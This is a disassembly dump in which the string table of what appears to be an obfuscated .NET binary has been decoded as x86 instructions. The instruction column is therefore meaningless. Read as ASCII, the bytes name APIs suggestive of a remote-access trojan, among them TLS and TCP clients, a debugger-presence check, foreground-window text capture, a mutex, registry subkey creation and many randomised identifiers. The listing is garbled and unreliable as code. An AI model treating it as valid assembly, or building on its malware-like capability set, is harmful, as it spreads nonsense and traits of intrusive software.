  409971:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409976:	65 74 00             	gs je  0x409979
  409979:	78 59                	js     0x4099d4
  40997b:	52                   	push   %edx
  40997c:	53                   	push   %ebx
  40997d:	6c                   	insb   (%dx),%es:(%edi)
  40997e:	51                   	push   %ecx
  40997f:	53                   	push   %ebx
  409980:	6e                   	outsb  %ds:(%esi),(%dx)
  409981:	49                   	dec    %ecx
  409982:	65 74 00             	gs je  0x409985
  409985:	53                   	push   %ebx
  409986:	79 73                	jns    0x4099fb
  409988:	74 65                	je     0x4099ef
  40998a:	6d                   	insl   (%dx),%es:(%edi)
  40998b:	2e 4e                	cs dec %esi
  40998d:	65 74 00             	gs je  0x409990
  409990:	54                   	push   %esp
  409991:	61                   	popa
  409992:	72 67                	jb     0x4099fb
  409994:	65 74 00             	gs je  0x409997
  409997:	53                   	push   %ebx
  409998:	6f                   	outsl  %ds:(%esi),(%dx)
  409999:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40999c:	74 00                	je     0x40999e
  40999e:	53                   	push   %ebx
  40999f:	79 73                	jns    0x409a14
  4099a1:	74 65                	je     0x409a08
  4099a3:	6d                   	insl   (%dx),%es:(%edi)
  4099a4:	2e 43                	cs inc %ebx
  4099a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a7:	6c                   	insb   (%dx),%es:(%edi)
  4099a8:	6c                   	insb   (%dx),%es:(%edi)
  4099a9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4099af:	73 2e                	jae    0x4099df
  4099b1:	49                   	dec    %ecx
  4099b2:	45                   	inc    %ebp
  4099b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b4:	75 6d                	jne    0x409a23
  4099b6:	65 72 61             	gs jb  0x409a1a
  4099b9:	74 6f                	je     0x409a2a
  4099bb:	72 2e                	jb     0x4099eb
  4099bd:	52                   	push   %edx
  4099be:	65 73 65             	gs jae 0x409a26
  4099c1:	74 00                	je     0x4099c3
  4099c3:	67 65 74 5f          	addr16 gs je 0x409a26
  4099c7:	4f                   	dec    %edi
  4099c8:	66 66 73 65          	data16 data16 jae 0x409a31
  4099cc:	74 00                	je     0x4099ce
  4099ce:	73 65                	jae    0x409a35
  4099d0:	74 5f                	je     0x409a31
  4099d2:	4f                   	dec    %edi
  4099d3:	66 66 73 65          	data16 data16 jae 0x409a3c
  4099d7:	74 00                	je     0x4099d9
  4099d9:	53                   	push   %ebx
  4099da:	70 6c                	jo     0x409a48
  4099dc:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099e3:	00 
  4099e4:	49                   	dec    %ecx
  4099e5:	41                   	inc    %ecx
  4099e6:	73 79                	jae    0x409a61
  4099e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e9:	63 52 65             	arpl   %edx,0x65(%edx)
  4099ec:	73 75                	jae    0x409a63
  4099ee:	6c                   	insb   (%dx),%es:(%edi)
  4099ef:	74 00                	je     0x4099f1
  4099f1:	54                   	push   %esp
  4099f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f3:	55                   	push   %ebp
  4099f4:	70 70                	jo     0x409a66
  4099f6:	65 72 49             	gs jb  0x409a42
  4099f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4099fa:	76 61                	jbe    0x409a5d
  4099fc:	72 69                	jb     0x409a67
  4099fe:	61                   	popa
  4099ff:	6e                   	outsb  %ds:(%esi),(%dx)
  409a00:	74 00                	je     0x409a02
  409a02:	57                   	push   %edi
  409a03:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a07:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a0e:	74 5f                	je     0x409a6f
  409a10:	53                   	push   %ebx
  409a11:	73 6c                	jae    0x409a7f
  409a13:	43                   	inc    %ebx
  409a14:	6c                   	insb   (%dx),%es:(%edi)
  409a15:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a1c:	74 5f                	je     0x409a7d
  409a1e:	53                   	push   %ebx
  409a1f:	73 6c                	jae    0x409a8d
  409a21:	43                   	inc    %ebx
  409a22:	6c                   	insb   (%dx),%es:(%edi)
  409a23:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a2a:	74 5f                	je     0x409a8b
  409a2c:	54                   	push   %esp
  409a2d:	63 70 43             	arpl   %esi,0x43(%eax)
  409a30:	6c                   	insb   (%dx),%es:(%edi)
  409a31:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a38:	74 5f                	je     0x409a99
  409a3a:	54                   	push   %esp
  409a3b:	63 70 43             	arpl   %esi,0x43(%eax)
  409a3e:	6c                   	insb   (%dx),%es:(%edi)
  409a3f:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a46:	74 68                	je     0x409ab0
  409a48:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a4a:	74 69                	je     0x409ab5
  409a4c:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a4f:	65 41                	gs inc %ecx
  409a51:	73 43                	jae    0x409a96
  409a53:	6c                   	insb   (%dx),%es:(%edi)
  409a54:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a5b:	73 74                	jae    0x409ad1
  409a5d:	65 6d                	gs insl (%dx),%es:(%edi)
  409a5f:	2e 4d                	cs dec %ebp
  409a61:	61                   	popa
  409a62:	6e                   	outsb  %ds:(%esi),(%dx)
  409a63:	61                   	popa
  409a64:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a67:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a69:	74 00                	je     0x409a6b
  409a6b:	45                   	inc    %ebp
  409a6c:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6d:	76 69                	jbe    0x409ad8
  409a6f:	72 6f                	jb     0x409ae0
  409a71:	6e                   	outsb  %ds:(%esi),(%dx)
  409a72:	6d                   	insl   (%dx),%es:(%edi)
  409a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a75:	74 00                	je     0x409a77
  409a77:	53                   	push   %ebx
  409a78:	79 73                	jns    0x409aed
  409a7a:	74 65                	je     0x409ae1
  409a7c:	6d                   	insl   (%dx),%es:(%edi)
  409a7d:	2e 43                	cs inc %ebx
  409a7f:	6f                   	outsl  %ds:(%esi),(%dx)
  409a80:	6c                   	insb   (%dx),%es:(%edi)
  409a81:	6c                   	insb   (%dx),%es:(%edi)
  409a82:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a87:	6e                   	outsb  %ds:(%esi),(%dx)
  409a88:	73 2e                	jae    0x409ab8
  409a8a:	49                   	dec    %ecx
  409a8b:	45                   	inc    %ebp
  409a8c:	6e                   	outsb  %ds:(%esi),(%dx)
  409a8d:	75 6d                	jne    0x409afc
  409a8f:	65 72 61             	gs jb  0x409af3
  409a92:	74 6f                	je     0x409b03
  409a94:	72 2e                	jb     0x409ac4
  409a96:	67 65 74 5f          	addr16 gs je 0x409af9
  409a9a:	43                   	inc    %ebx
  409a9b:	75 72                	jne    0x409b0f
  409a9d:	72 65                	jb     0x409b04
  409a9f:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa0:	74 00                	je     0x409aa2
  409aa2:	47                   	inc    %edi
  409aa3:	65 74 43             	gs je  0x409ae9
  409aa6:	75 72                	jne    0x409b1a
  409aa8:	72 65                	jb     0x409b0f
  409aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  409aab:	74 00                	je     0x409aad
  409aad:	43                   	inc    %ebx
  409aae:	68 65 63 6b 52       	push   $0x526b6365
  409ab3:	65 6d                	gs insl (%dx),%es:(%edi)
  409ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab6:	74 65                	je     0x409b1d
  409ab8:	44                   	inc    %esp
  409ab9:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409abd:	67 65 72 50          	addr16 gs jb 0x409b11
  409ac1:	72 65                	jb     0x409b28
  409ac3:	73 65                	jae    0x409b2a
  409ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac6:	74 00                	je     0x409ac8
  409ac8:	67 65 74 5f          	addr16 gs je 0x409b2b
  409acc:	52                   	push   %edx
  409acd:	65 6d                	gs insl (%dx),%es:(%edi)
  409acf:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad0:	74 65                	je     0x409b37
  409ad2:	45                   	inc    %ebp
  409ad3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad4:	64 50                	fs push %eax
  409ad6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad7:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409ade:	5f                   	pop    %edi
  409adf:	43                   	inc    %ebx
  409ae0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ae1:	75 6e                	jne    0x409b51
  409ae3:	74 00                	je     0x409ae5
  409ae5:	67 65 74 5f          	addr16 gs je 0x409b48
  409ae9:	50                   	push   %eax
  409aea:	72 6f                	jb     0x409b5b
  409aec:	63 65 73             	arpl   %esp,0x73(%ebp)
  409aef:	73 6f                	jae    0x409b60
  409af1:	72 43                	jb     0x409b36
  409af3:	6f                   	outsl  %ds:(%esi),(%dx)
  409af4:	75 6e                	jne    0x409b64
  409af6:	74 00                	je     0x409af8
  409af8:	47                   	inc    %edi
  409af9:	65 74 50             	gs je  0x409b4c
  409afc:	61                   	popa
  409afd:	74 68                	je     0x409b67
  409aff:	52                   	push   %edx
  409b00:	6f                   	outsl  %ds:(%esi),(%dx)
  409b01:	6f                   	outsl  %ds:(%esi),(%dx)
  409b02:	74 00                	je     0x409b04
  409b04:	50                   	push   %eax
  409b05:	61                   	popa
  409b06:	72 61                	jb     0x409b69
  409b08:	6d                   	insl   (%dx),%es:(%edi)
  409b09:	65 74 65             	gs je  0x409b71
  409b0c:	72 69                	jb     0x409b77
  409b0e:	7a 65                	jp     0x409b75
  409b10:	64 54                	fs push %esp
  409b12:	68 72 65 61 64       	push   $0x64616572
  409b17:	53                   	push   %ebx
  409b18:	74 61                	je     0x409b7b
  409b1a:	72 74                	jb     0x409b90
  409b1c:	00 43 6f             	add    %al,0x6f(%ebx)
  409b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  409b20:	76 65                	jbe    0x409b87
  409b22:	72 74                	jb     0x409b98
  409b24:	00 71 49             	add    %dh,0x49(%ecx)
  409b27:	61                   	popa
  409b28:	42                   	inc    %edx
  409b29:	78 58                	js     0x409b83
  409b2b:	57                   	push   %edi
  409b2c:	6c                   	insb   (%dx),%es:(%edi)
  409b2d:	51                   	push   %ecx
  409b2e:	59                   	pop    %ecx
  409b2f:	73 74                	jae    0x409ba5
  409b31:	00 46 61             	add    %al,0x61(%esi)
  409b34:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b3b:	54 
  409b3c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3d:	4c                   	dec    %esp
  409b3e:	69 73 74 00 52 65 41 	imul   $0x41655200,0x74(%ebx),%esi
  409b45:	74 68                	je     0x409baf
  409b47:	61                   	popa
  409b48:	59                   	pop    %ecx
  409b49:	75 77                	jne    0x409bc2
  409b4b:	73 74                	jae    0x409bc1
  409b4d:	00 53 79             	add    %dl,0x79(%ebx)
  409b50:	73 74                	jae    0x409bc6
  409b52:	65 6d                	gs insl (%dx),%es:(%edi)
  409b54:	2e 43                	cs inc %ebx
  409b56:	6f                   	outsl  %ds:(%esi),(%dx)
  409b57:	6c                   	insb   (%dx),%es:(%edi)
  409b58:	6c                   	insb   (%dx),%es:(%edi)
  409b59:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b5f:	73 2e                	jae    0x409b8f
  409b61:	49                   	dec    %ecx
  409b62:	45                   	inc    %ebp
  409b63:	6e                   	outsb  %ds:(%esi),(%dx)
  409b64:	75 6d                	jne    0x409bd3
  409b66:	65 72 61             	gs jb  0x409bca
  409b69:	74 6f                	je     0x409bda
  409b6b:	72 2e                	jb     0x409b9b
  409b6d:	4d                   	dec    %ebp
  409b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b6f:	76 65                	jbe    0x409bd6
  409b71:	4e                   	dec    %esi
  409b72:	65 78 74             	gs js  0x409be9
  409b75:	00 53 79             	add    %dl,0x79(%ebx)
  409b78:	73 74                	jae    0x409bee
  409b7a:	65 6d                	gs insl (%dx),%es:(%edi)
  409b7c:	2e 54                	cs push %esp
  409b7e:	65 78 74             	gs js  0x409bf5
  409b81:	00 47 65             	add    %al,0x65(%edi)
  409b84:	74 57                	je     0x409bdd
  409b86:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409b8d:	78 74                	js     0x409c03
  409b8f:	00 6c 66 4d          	add    %ch,0x4d(%esi,%eiz,2)
  409b93:	55                   	push   %ebp
  409b94:	58                   	pop    %eax
  409b95:	5a                   	pop    %edx
  409b96:	6a 73                	push   $0x73
  409b98:	74 57                	je     0x409bf1
  409b9a:	44                   	inc    %esp
  409b9b:	75 00                	jne    0x409b9d
  409b9d:	51                   	push   %ecx
  409b9e:	65 46                	gs inc %esi
  409ba0:	55                   	push   %ebp
  409ba1:	75 55                	jne    0x409bf8
  409ba3:	54                   	push   %esp
  409ba4:	5a                   	pop    %edx
  409ba5:	55                   	push   %ebp
  409ba6:	69 4a 75 00 55 44 61 	imul   $0x61445500,0x75(%edx),%ecx
  409bad:	72 78                	jb     0x409c27
  409baf:	6c                   	insb   (%dx),%es:(%edi)
  409bb0:	4c                   	dec    %esp
  409bb1:	59                   	pop    %ecx
  409bb2:	4c                   	dec    %esp
  409bb3:	61                   	popa
  409bb4:	75 00                	jne    0x409bb6
  409bb6:	71 70                	jno    0x409c28
  409bb8:	6d                   	insl   (%dx),%es:(%edi)
  409bb9:	66 4b                	dec    %bx
  409bbb:	52                   	push   %edx
  409bbc:	50                   	push   %eax
  409bbd:	64 61                	fs popa
  409bbf:	75 00                	jne    0x409bc1
  409bc1:	6d                   	insl   (%dx),%es:(%edi)
  409bc2:	51                   	push   %ecx
  409bc3:	5a                   	pop    %edx
  409bc4:	56                   	push   %esi
  409bc5:	71 66                	jno    0x409c2d
  409bc7:	52                   	push   %edx
  409bc8:	68 57 65 75 00       	push   $0x756557
  409bcd:	67 4f                	addr16 dec %edi
  409bcf:	4e                   	dec    %esi
  409bd0:	74 50                	je     0x409c22
  409bd2:	42                   	inc    %edx
  409bd3:	47                   	inc    %edi
  409bd4:	72 47                	jb     0x409c1d
  409bd6:	59                   	pop    %ecx
  409bd7:	66 75 00             	data16 jne 0x409bda
  409bda:	59                   	pop    %ecx
  409bdb:	4a                   	dec    %edx
  409bdc:	64 45                	fs inc %ebp
  409bde:	72 6d                	jb     0x409c4d
  409be0:	4c                   	dec    %esp
  409be1:	7a 79                	jp     0x409c5c
  409be3:	6f                   	outsl  %ds:(%esi),(%dx)
  409be4:	53                   	push   %ebx
  409be5:	6b 75 00 4e          	imul   $0x4e,0x0(%ebp),%esi
  409be9:	54                   	push   %esp
  409bea:	6d                   	insl   (%dx),%es:(%edi)
  409beb:	57                   	push   %edi
  409bec:	53                   	push   %ebx
  409bed:	6b 41 67 7a          	imul   $0x7a,0x67(%ecx),%eax
  409bf1:	44                   	inc    %esp
  409bf2:	45                   	inc    %ebp
  409bf3:	71 6c                	jno    0x409c61
  409bf5:	75 00                	jne    0x409bf7
  409bf7:	59                   	pop    %ecx
  409bf8:	51                   	push   %ecx
  409bf9:	41                   	inc    %ecx
  409bfa:	57                   	push   %edi
  409bfb:	53                   	push   %ebx
  409bfc:	61                   	popa
  409bfd:	6b 43 45 4a          	imul   $0x4a,0x45(%ebx),%eax
  409c01:	53                   	push   %ebx
  409c02:	6d                   	insl   (%dx),%es:(%edi)
  409c03:	4f                   	dec    %edi
  409c04:	56                   	push   %esi
  409c05:	6d                   	insl   (%dx),%es:(%edi)
  409c06:	75 00                	jne    0x409c08
  409c08:	50                   	push   %eax
  409c09:	6f                   	outsl  %ds:(%esi),(%dx)
  409c0a:	52                   	push   %edx
  409c0b:	6d                   	insl   (%dx),%es:(%edi)
  409c0c:	4b                   	dec    %ebx
  409c0d:	50                   	push   %eax
  409c0e:	48                   	dec    %eax
  409c0f:	67 6a 4a             	addr16 push $0x4a
  409c12:	4d                   	dec    %ebp
  409c13:	4a                   	dec    %edx
  409c14:	48                   	dec    %eax
  409c15:	76 00                	jbe    0x409c17
  409c17:	66 53                	push   %bx
  409c19:	56                   	push   %esi
  409c1a:	7a 70                	jp     0x409c8c
  409c1c:	74 56                	je     0x409c74
  409c1e:	78 65                	js     0x409c85
  409c20:	61                   	popa
  409c21:	49                   	dec    %ecx
  409c22:	76 00                	jbe    0x409c24
  409c24:	4a                   	dec    %edx
  409c25:	7a 76                	jp     0x409c9d
  409c27:	63 4d 46             	arpl   %ecx,0x46(%ebp)
  409c2a:	6b 66 70 4c          	imul   $0x4c,0x70(%esi),%esp
  409c2e:	4d                   	dec    %ebp
  409c2f:	76 00                	jbe    0x409c31
  409c31:	4b                   	dec    %ebx
  409c32:	57                   	push   %edi
  409c33:	7a 4f                	jp     0x409c84
  409c35:	70 54                	jo     0x409c8b
  409c37:	57                   	push   %edi
  409c38:	44                   	inc    %esp
  409c39:	47                   	inc    %edi
  409c3a:	57                   	push   %edi
  409c3b:	50                   	push   %eax
  409c3c:	75 53                	jne    0x409c91
  409c3e:	76 00                	jbe    0x409c40
  409c40:	6b 74 5a 4e 4d       	imul   $0x4d,0x4e(%edx,%ebx,2),%esi
  409c45:	67 48                	addr16 dec %eax
  409c47:	4c                   	dec    %esp
  409c48:	46                   	inc    %esi
  409c49:	72 61                	jb     0x409cac
  409c4b:	76 00                	jbe    0x409c4d
  409c4d:	48                   	dec    %eax
  409c4e:	6c                   	insb   (%dx),%es:(%edi)
  409c4f:	43                   	inc    %ebx
  409c50:	45                   	inc    %ebp
  409c51:	68 74 4f 68 78       	push   $0x78684f74
  409c56:	4c                   	dec    %esp
  409c57:	66 76 00             	data16 jbe 0x409c5a
  409c5a:	62 44 77 44          	bound  %eax,0x44(%edi,%esi,2)
  409c5e:	7a 61                	jp     0x409cc1
  409c60:	4d                   	dec    %ebp
  409c61:	6b 6f 46 77          	imul   $0x77,0x46(%edi),%ebp
  409c65:	00 51 5a             	add    %dl,0x5a(%ecx)
  409c68:	5a                   	pop    %edx
  409c69:	7a 6e                	jp     0x409cd9
  409c6b:	66 61                	popaw
  409c6d:	4e                   	dec    %esi
  409c6e:	75 6b                	jne    0x409cdb
  409c70:	6f                   	outsl  %ds:(%esi),(%dx)
  409c71:	6e                   	outsb  %ds:(%esi),(%dx)
  409c72:	63 6b 6a             	arpl   %ebp,0x6a(%ebx)
  409c75:	4a                   	dec    %edx
  409c76:	77 00                	ja     0x409c78
  409c78:	66 76 54             	data16 jbe 0x409ccf
  409c7b:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7c:	42                   	inc    %edx
  409c7d:	48                   	dec    %eax
  409c7e:	65 46                	gs inc %esi
  409c80:	63 58 66             	arpl   %ebx,0x66(%eax)
  409c83:	4c                   	dec    %esp
  409c84:	77 00                	ja     0x409c86
  409c86:	41                   	inc    %ecx
  409c87:	79 55                	jns    0x409cde
  409c89:	6d                   	insl   (%dx),%es:(%edi)
  409c8a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c8b:	61                   	popa
  409c8c:	77 5a                	ja     0x409ce8
  409c8e:	6c                   	insb   (%dx),%es:(%edi)
  409c8f:	4f                   	dec    %edi
  409c90:	77 00                	ja     0x409c92
  409c92:	4f                   	dec    %edi
  409c93:	6a 4a                	push   $0x4a
  409c95:	6e                   	outsb  %ds:(%esi),(%dx)
  409c96:	62 52 6d             	bound  %edx,0x6d(%edx)
  409c99:	76 70                	jbe    0x409d0b
  409c9b:	62 48 55             	bound  %ecx,0x55(%eax)
  409c9e:	45                   	inc    %ebp
  409c9f:	5a                   	pop    %edx
  409ca0:	51                   	push   %ecx
  409ca1:	77 00                	ja     0x409ca3
  409ca3:	52                   	push   %edx
  409ca4:	42                   	inc    %edx
  409ca5:	66 46                	inc    %si
  409ca7:	66 48                	dec    %ax
  409ca9:	71 53                	jno    0x409cfe
  409cab:	51                   	push   %ecx
  409cac:	57                   	push   %edi
  409cad:	54                   	push   %esp
  409cae:	77 00                	ja     0x409cb0
  409cb0:	62 41 6b             	bound  %eax,0x6b(%ecx)
  409cb3:	43                   	inc    %ebx
  409cb4:	4f                   	dec    %edi
  409cb5:	4b                   	dec    %ebx
  409cb6:	59                   	pop    %ecx
  409cb7:	73 58                	jae    0x409d11
  409cb9:	61                   	popa
  409cba:	77 00                	ja     0x409cbc
  409cbc:	71 63                	jno    0x409d21
  409cbe:	77 41                	ja     0x409d01
  409cc0:	67 68 5a 79 65 42    	addr16 push $0x4265795a
  409cc6:	4c                   	dec    %esp
  409cc7:	71 64                	jno    0x409d2d
  409cc9:	77 00                	ja     0x409ccb
  409ccb:	72 53                	jb     0x409d20
  409ccd:	58                   	pop    %eax
  409cce:	75 75                	jne    0x409d45
  409cd0:	57                   	push   %edi
  409cd1:	68 6b 52 49 70       	push   $0x7049526b
  409cd6:	66 6d                	insw   (%dx),%es:(%edi)
  409cd8:	77 00                	ja     0x409cda
  409cda:	47                   	inc    %edi
  409cdb:	65 74 46             	gs je  0x409d24
  409cde:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdf:	72 65                	jb     0x409d46
  409ce1:	67 72 6f             	addr16 jb 0x409d53
  409ce4:	75 6e                	jne    0x409d54
  409ce6:	64 57                	fs push %edi
  409ce8:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409cef:	65 74 5f             	gs je  0x409d51
  409cf2:	43                   	inc    %ebx
  409cf3:	72 65                	jb     0x409d5a
  409cf5:	61                   	popa
  409cf6:	74 65                	je     0x409d5d
  409cf8:	4e                   	dec    %esi
  409cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  409cfa:	57                   	push   %edi
  409cfb:	69 6e 64 6f 77 00 56 	imul   $0x5600776f,0x64(%esi),%ebp
  409d02:	65 47                	gs inc %edi
  409d04:	50                   	push   %eax
  409d05:	46                   	inc    %esi
  409d06:	4d                   	dec    %ebp
  409d07:	56                   	push   %esi
  409d08:	63 43 76             	arpl   %eax,0x76(%ebx)
  409d0b:	78 55                	js     0x409d62
  409d0d:	61                   	popa
  409d0e:	61                   	popa
  409d0f:	45                   	inc    %ebp
  409d10:	70 77                	jo     0x409d89
  409d12:	00 51 62             	add    %dl,0x62(%ecx)
  409d15:	79 65                	jns    0x409d7c
  409d17:	48                   	dec    %eax
  409d18:	64 73 4c             	fs jae 0x409d67
  409d1b:	73 69                	jae    0x409d86
  409d1d:	63 75 77             	arpl   %esi,0x77(%ebp)
  409d20:	00 59 49             	add    %bl,0x49(%ecx)
  409d23:	64 49                	fs dec %ecx
  409d25:	75 47                	jne    0x409d6e
  409d27:	73 57                	jae    0x409d80
  409d29:	4d                   	dec    %ebp
  409d2a:	78 00                	js     0x409d2c
  409d2c:	42                   	inc    %edx
  409d2d:	55                   	push   %ebp
  409d2e:	77 74                	ja     0x409da4
  409d30:	76 7a                	jbe    0x409dac
  409d32:	72 42                	jb     0x409d76
  409d34:	7a 69                	jp     0x409d9f
  409d36:	64 58                	fs pop %eax
  409d38:	53                   	push   %ebx
  409d39:	75 6b                	jne    0x409da6
  409d3b:	52                   	push   %edx
  409d3c:	78 00                	js     0x409d3e
  409d3e:	75 6f                	jne    0x409daf
  409d40:	75 61                	jne    0x409da3
  409d42:	78 5a                	js     0x409d9e
  409d44:	4f                   	dec    %edi
  409d45:	6b 55 78 00          	imul   $0x0,0x78(%ebp),%edx
  409d49:	68 74 55 58 69       	push   $0x69585574
  409d4e:	4e                   	dec    %esi
  409d4f:	47                   	inc    %edi
  409d50:	4f                   	dec    %edi
  409d51:	54                   	push   %esp
  409d52:	65 65 78 00          	gs gs js 0x409d56
  409d56:	4d                   	dec    %ebp
  409d57:	75 74                	jne    0x409dcd
  409d59:	65 78 00             	gs js  0x409d5c
  409d5c:	5a                   	pop    %edx
  409d5d:	7a 61                	jp     0x409dc0
  409d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d60:	78 68                	js     0x409dca
  409d62:	6e                   	outsb  %ds:(%esi),(%dx)
  409d63:	6e                   	outsb  %ds:(%esi),(%dx)
  409d64:	68 78 00 69 50       	push   $0x50690078
  409d69:	4d                   	dec    %ebp
  409d6a:	47                   	inc    %edi
  409d6b:	63 72 45             	arpl   %esi,0x45(%edx)
  409d6e:	47                   	inc    %edi
  409d6f:	57                   	push   %edi
  409d70:	4b                   	dec    %ebx
  409d71:	6d                   	insl   (%dx),%es:(%edi)
  409d72:	78 00                	js     0x409d74
  409d74:	4d                   	dec    %ebp
  409d75:	75 7a                	jne    0x409df1
  409d77:	74 6e                	je     0x409de7
  409d79:	55                   	push   %ebp
  409d7a:	67 4f                	addr16 dec %edi
  409d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  409d7d:	4d                   	dec    %ebp
  409d7e:	72 42                	jb     0x409dc2
  409d80:	79 00                	jns    0x409d82
  409d82:	5a                   	pop    %edx
  409d83:	46                   	inc    %esi
  409d84:	44                   	inc    %esp
  409d85:	63 48 6e             	arpl   %ecx,0x6e(%eax)
  409d88:	77 54                	ja     0x409dde
  409d8a:	4a                   	dec    %edx
  409d8b:	4b                   	dec    %ebx
  409d8c:	79 00                	jns    0x409d8e
  409d8e:	77 54                	ja     0x409de4
  409d90:	4d                   	dec    %ebp
  409d91:	67 53                	addr16 push %ebx
  409d93:	57                   	push   %edi
  409d94:	79 59                	jns    0x409def
  409d96:	49                   	dec    %ecx
  409d97:	63 61 79             	arpl   %esp,0x79(%ecx)
  409d9a:	00 49 6e             	add    %cl,0x6e(%ecx)
  409d9d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409da4:	65 
  409da5:	41                   	inc    %ecx
  409da6:	72 72                	jb     0x409e1a
  409da8:	61                   	popa
  409da9:	79 00                	jns    0x409dab
  409dab:	54                   	push   %esp
  409dac:	6f                   	outsl  %ds:(%esi),(%dx)
  409dad:	41                   	inc    %ecx
  409dae:	72 72                	jb     0x409e22
  409db0:	61                   	popa
  409db1:	79 00                	jns    0x409db3
  409db3:	67 65 74 5f          	addr16 gs je 0x409e16
  409db7:	41                   	inc    %ecx
  409db8:	73 41                	jae    0x409dfb
  409dba:	72 72                	jb     0x409e2e
  409dbc:	61                   	popa
  409dbd:	79 00                	jns    0x409dbf
  409dbf:	63 78 6c             	arpl   %edi,0x6c(%eax)
  409dc2:	74 48                	je     0x409e0c
  409dc4:	56                   	push   %esi
  409dc5:	41                   	inc    %ecx
  409dc6:	48                   	dec    %eax
  409dc7:	78 4b                	js     0x409e14
  409dc9:	4e                   	dec    %esi
  409dca:	63 79 00             	arpl   %edi,0x0(%ecx)
  409dcd:	67 65 74 5f          	addr16 gs je 0x409e30
  409dd1:	4b                   	dec    %ebx
  409dd2:	65 79 00             	gs jns 0x409dd5
  409dd5:	73 65                	jae    0x409e3c
  409dd7:	74 5f                	je     0x409e38
  409dd9:	4b                   	dec    %ebx
  409dda:	65 79 00             	gs jns 0x409ddd
  409ddd:	43                   	inc    %ebx
  409dde:	72 65                	jb     0x409e45
  409de0:	61                   	popa
  409de1:	74 65                	je     0x409e48
  409de3:	53                   	push   %ebx
  409de4:	75 62                	jne    0x409e48
  409de6:	4b                   	dec    %ebx
  409de7:	65 79 00             	gs jns 0x409dea
  409dea:	4f                   	dec    %edi
  409deb:	70 65                	jo     0x409e52
  409ded:	6e                   	outsb  %ds:(%esi),(%dx)
  409dee:	53                   	push   %ebx
  409def:	75 62                	jne    0x409e53
  409df1:	4b                   	dec    %ebx
  409df2:	65 79 00             	gs jns 0x409df5
  409df5:	67 65 74 5f          	addr16 gs je 0x409e58
  409df9:	50                   	push   %eax
  409dfa:	75 62                	jne    0x409e5e
  409dfc:	6c                   	insb   (%dx),%es:(%edi)
  409dfd:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409e04:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e0b:	4b 65 
  409e0d:	79 00                	jns    0x409e0f
  409e0f:	53                   	push   %ebx
  409e10:	79 73                	jns    0x409e85
  409e12:	74 65                	je     0x409e79
  409e14:	6d                   	insl   (%dx),%es:(%edi)
  409e15:	2e 53                	cs push %ebx
  409e17:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e1b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e22:	70 
  409e23:	74 6f                	je     0x409e94
  409e25:	67 72 61             	addr16 jb 0x409e89
  409e28:	70 68                	jo     0x409e92
  409e2a:	79 00                	jns    0x409e2c
  409e2c:	41                   	inc    %ecx
  409e2d:	73 73                	jae    0x409ea2
  409e2f:	65 6d                	gs insl (%dx),%es:(%edi)
  409e31:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e35:	41                   	inc    %ecx
  409e36:	64 64 72 65          	fs fs jb 0x409e9f
  409e3a:	73 73                	jae    0x409eaf
  409e3c:	46                   	inc    %esi
  409e3d:	61                   	popa
  409e3e:	6d                   	insl   (%dx),%es:(%edi)
